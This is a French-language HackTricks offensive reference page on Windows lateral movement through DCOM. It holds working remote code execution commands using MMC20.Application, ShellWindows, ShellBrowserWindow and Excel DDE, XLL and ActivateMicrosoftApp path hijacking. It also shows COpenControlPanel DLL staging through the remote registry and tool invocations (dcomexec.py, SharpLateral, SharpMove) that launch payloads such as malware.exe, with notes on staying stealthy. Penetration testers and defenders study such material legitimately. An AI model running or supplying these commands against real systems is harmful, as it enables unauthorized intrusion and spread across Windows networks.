# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

Le mouvement latéral via DCOM est intéressant, car il réutilise les serveurs COM existants exposés via RPC/DCOM au lieu de créer un service ou une tâche planifiée. En pratique, cela signifie que la connexion initiale commence généralement sur TCP/135, puis passe à des ports RPC élevés attribués dynamiquement.

## Prérequis et pièges

- Il faut généralement disposer d'un contexte d'administrateur local sur la cible, et le serveur COM distant doit autoriser le lancement/l'activation à distance.
- Depuis le **14 mars 2023**, Microsoft impose le renforcement de DCOM sur les systèmes pris en charge. Les anciens clients qui demandent un niveau d'authentification d'activation faible peuvent échouer s'ils ne négocient pas au moins `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Les clients Windows modernes augmentent généralement automatiquement ce niveau, les outils actuels continuent donc normalement de fonctionner.<sup>[[3]](#references)</sup>
- L'exécution manuelle ou scriptée via DCOM nécessite généralement TCP/135 ainsi que la plage de ports RPC dynamiques de la cible. Si vous utilisez `dcomexec.py` d'Impacket et souhaitez récupérer la sortie des commandes, vous avez généralement aussi besoin d'un accès SMB à `ADMIN$` (ou à un autre partage accessible en lecture/écriture).
- Si RPC/DCOM fonctionne mais que SMB est bloqué, `dcomexec.py -nooutput` peut tout de même être utile pour une exécution à l'aveugle.

Vérifications rapides :

```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```

## MMC20.Application

Pour en savoir plus sur cette technique, consultez le [billet original sur MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/).<sup>[[1]](#references)</sup>

Les objets Distributed Component Object Model (DCOM) offrent des possibilités intéressantes pour les interactions avec des objets via le réseau. Microsoft fournit une documentation complète sur DCOM et Component Object Model (COM), accessible [ici pour DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) et [ici pour COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). La liste des applications DCOM peut être récupérée à l’aide de la commande PowerShell suivante :

```bash
Get-CimInstance Win32_DCOMApplication
```

L’objet COM [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx) permet de scripter les opérations des composants logiciels enfichables MMC. Il contient notamment une méthode `ExecuteShellCommand` sous `Document.ActiveView`. Vous trouverez plus d’informations sur cette méthode [ici](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Vérifiez son fonctionnement en l’exécutant :<sup>[[6]](#references)</sup>

Cette fonctionnalité permet d’exécuter des commandes sur un réseau via une application DCOM. Pour interagir à distance avec DCOM en tant qu’administrateur, PowerShell peut être utilisé comme suit :

```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```

Cette commande se connecte à l’application DCOM et renvoie une instance de l’objet COM. La méthode ExecuteShellCommand peut ensuite être appelée pour exécuter un processus sur l’hôte distant. Le processus comprend les étapes suivantes :

Vérifier les méthodes :

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```

Obtenir une RCE :

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
    "cmd.exe",
    $null,
    "/c powershell -NoP -W Hidden -Enc <B64>",
    "7"
)
```

Le dernier argument correspond au style de la fenêtre. `7` maintient la fenêtre réduite. En pratique, l’exécution basée sur MMC entraîne généralement le lancement de votre payload par un processus `mmc.exe` distant, contrairement aux objets associés à Explorer présentés ci-dessous.

## ShellWindows & ShellBrowserWindow

**Pour en savoir plus sur cette technique, consultez l’article original [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

L’objet **MMC20.Application** a été observé sans valeur `LaunchPermission` spécifique à l’application.<sup>[[2]](#references)</sup> Cela ne donne pas accès à lui seul : COM vérifie l’ACL `DefaultLaunchPermission` de la machine et, le cas échéant, les restrictions de lancement et d’accès à l’échelle de la machine.<sup>[[9]](#references)[[10]](#references)</sup> Pour plus de détails, consultez [ce fil](https://twitter.com/tiraniddo/status/817532039771525120). Il est également recommandé d’utiliser OleView .NET de [@tiraniddo](https://twitter.com/tiraniddo) pour filtrer les objets sans Launch Permission explicite.

Deux objets spécifiques, `ShellBrowserWindow` et `ShellWindows`, ont été mis en évidence en raison de l’absence de Launch Permissions explicites.<sup>[[2]](#references)</sup> L’absence d’une valeur `LaunchPermission` sous `HKCR:\AppID\{guid}` signifie qu’il n’existe pas d’ACL de lancement spécifique à l’application ; cela ne signifie **pas** que l’activation à distance est sans restriction.<sup>[[9]](#references)[[10]](#references)</sup>

Par rapport à `MMC20.Application`, ces objets sont souvent plus discrets du point de vue OPSEC, car la commande devient généralement un processus enfant de `explorer.exe` sur l’hôte distant, plutôt que de `mmc.exe`.

### ShellWindows

Comme `ShellWindows` ne dispose pas de ProgID, les méthodes .NET `Type.GetTypeFromCLSID` et `Activator.CreateInstance` permettent d’instancier l’objet à l’aide de son CLSID. Cette procédure utilise OleView .NET pour récupérer le CLSID de `ShellWindows`. Une fois l’objet instancié, il est possible d’interagir avec lui via la méthode `WindowsShell.Item`, puis d’invoquer une méthode telle que `Document.Application.ShellExecute`.<sup>[[2]](#references)</sup>

Des commandes PowerShell ont été fournies pour instancier l’objet et exécuter des commandes à distance :

```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```

### ShellBrowserWindow

`ShellBrowserWindow` est similaire, mais vous pouvez l’instancier directement via son CLSID et pivoter vers `Document.Application.ShellExecute` :

```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
    "cmd.exe",
    "/c whoami > C:\\Windows\\Temp\\dcom.txt",
    "C:\\Windows\\System32",
    $null,
    0
)
```

### Mouvement latéral avec les objets DCOM Excel

Le mouvement latéral peut être réalisé en exploitant les objets DCOM Excel. Pour plus d’informations, il est conseillé de lire l’article sur l’utilisation d’Excel DDE pour effectuer un mouvement latéral via DCOM sur le [blog de Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).<sup>[[5]](#references)</sup>

Le projet Empire fournit un script PowerShell qui montre comment utiliser Excel pour exécuter du code à distance (RCE) en manipulant des objets DCOM. Voici des extraits du script disponible dans le [dépôt GitHub d’Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), qui présentent différentes méthodes pour exploiter Excel afin d’obtenir une RCE :

```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $isx64 = [boolean]$obj.Application.ProductCode[21]
    Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $Obj.DisplayAlerts = $false
    $Obj.DDEInitiate("cmd", "/c $Command")
}
```

Des recherches récentes ont étendu cette technique avec la méthode `ActivateMicrosoftApp()` de `Excel.Application`. L’idée principale est qu’Excel peut tenter de lancer des applications Microsoft plus anciennes, comme FoxPro, Schedule Plus ou Project, en les recherchant dans le `PATH` du système. Si un opérateur peut placer un payload portant l’un de ces noms attendus dans un emplacement inscriptible faisant partie du `PATH` de la cible, Excel l’exécutera.<sup>[[4]](#references)</sup>

Conditions requises pour cette variante :

- Droits d’admin local sur la cible
- Excel installé sur la cible
- Possibilité d’écrire un payload dans un répertoire inscriptible du `PATH` de la cible

Exemple pratique exploitant la recherche de FoxPro (`FOXPROW.exe`) :

```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```

Si l’hôte attaquant ne possède pas le ProgID local `Excel.Application` enregistré, instanciez l’objet distant à l’aide de son CLSID à la place :

```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```

Valeurs dont l’exploitation a été observée en pratique :

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### COpenControlPanel — chargement d’une DLL enregistrée du Panneau de configuration

La classe `COpenControlPanel` (CLSID `{06622D85-6856-4460-8DE1-A81921B41C4B}`) expose `IOpenControlPanel` (IID `{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}`). Sa méthode `Open()` provoque le chargement des DLL du Panneau de configuration enregistrées sous la clé `Control Panel\Cpls` par un `dllhost.exe` distant. Sur les systèmes testés, la classe ne définit aucune autorisation explicite de lancement ou d’accès ; elle hérite donc de la stratégie DCOM par défaut (qui exige normalement des droits d’administrateur pour l’activation à distance). Un nom d’élément aléatoire suffit à faire traiter les DLL enregistrées par `Open()` ; le payload n’a pas besoin d’avoir l’extension `.cpl`, mais doit être une DLL valide de l’architecture appropriée.<sup>[[7]](#references)</sup>

Cette primitive repose sur un mécanisme **stage-and-trigger**, et non sur une exécution par commande seule : il faut d’abord copier une DLL sur la cible et créer une valeur `REG_EXPAND_SZ` qui pointe vers celle-ci, puis activer l’objet via DCOM. Par exemple, depuis un contexte Windows avec des droits d’administrateur :<sup>[[7]](#references)</sup>

```cmd
copy payload.dll \\target\C$\Windows\Temp\panel.dll
reg.exe add "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /t REG_EXPAND_SZ /d "C:\Windows\Temp\panel.dll" /f
```

Le client public [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger) implémente l’appel DCOM non documenté avec Impacket. Il suffit de fournir un nom arbitraire d’élément du Panneau de configuration ; le client peut signaler une erreur RPC même si `dllhost.exe` a chargé la DLL.<sup>[[8]](#references)</sup>

```bash
git clone https://github.com/klsecservices/CPLDCOMTrigger
cd CPLDCOMTrigger
python3 CPLTrig.py 'DOMAIN/user:password@target' -cpl random

# Pass-the-hash and Kerberos are also implemented
python3 CPLTrig.py 'DOMAIN/user@target' -hashes ':NTHASH' -cpl random
python3 CPLTrig.py 'DOMAIN/user@target.domain.local' -aesKey AES_KEY_HEX -dc-ip 10.10.10.10 -cpl random
```

Sur le plan opérationnel, cette méthode nécessite également un canal d’écriture de fichiers et un accès au registre distant ; elle est donc plus bruyante que `MMC20`/`ShellWindows`. Elle crée un effet secondaire de persistance, car l’ouverture ultérieure du Panneau de configuration peut charger à nouveau la même entrée. Supprimez la valeur après l’exécution et recherchez les valeurs inattendues dans `Control Panel\Cpls`, ainsi que les chargements inhabituels de DLL dans `dllhost.exe`.<sup>[[7]](#references)</sup>

```cmd
reg.exe delete "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /f
del \\target\C$\Windows\Temp\panel.dll
```

### Outils d’automatisation du mouvement latéral

Deux outils sont mis en avant pour automatiser ces techniques :

- **Invoke-DCOM.ps1** : un script PowerShell fourni par le projet Empire qui simplifie l’invocation de différentes méthodes d’exécution de code sur des machines distantes. Ce script est disponible dans le dépôt GitHub d’Empire.

- **SharpLateral** : un outil conçu pour exécuter du code à distance, qui peut être utilisé avec la commande :

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- [SharpMove](https://github.com/0xthirteen/SharpMove):

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```

## Outils automatiques

- Le script Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) permet d’utiliser facilement toutes les méthodes commentées pour exécuter du code sur d’autres machines.
- Vous pouvez utiliser `dcomexec.py` d’Impacket pour exécuter des commandes sur des systèmes distants via DCOM. Les versions actuelles prennent en charge `ShellWindows`, `ShellBrowserWindow` et `MMC20`, et utilisent `ShellWindows` par défaut.

```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```

- Vous pourriez également utiliser [**SharpLateral**](https://github.com/mertdas/SharpLateral) :

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- Vous pouvez également utiliser [**SharpMove**](https://github.com/0xthirteen/SharpMove)

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```





## References

- [1] [Déplacement latéral à l’aide de l’objet COM MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [Déplacement latéral via DCOM : deuxième round](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442 — Gérer les modifications apportées à la fonctionnalité de sécurité Windows DCOM contre le contournement (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Déplacement latéral : exploiter la puissance de l’application Excel DCOM](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [Exploiter Excel DDE pour le déplacement latéral via DCOM](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com - Classe d’application MMC (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
- [7] [Utiliser des objets DCOM pour l’exécution de commandes à distance](https://securelist.com/lateral-movement-via-dcom-abusing-control-panel/118232/)
- [8] [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)
- [9] [DefaultLaunchPermission - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/com/defaultlaunchpermission)
- [10] [MS-DCOM : Annexe B, comportement du produit - Microsoft Learn](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/acc42954-4073-4f05-b850-efd562022077)
{{#include ../../banners/hacktricks-training.md}}
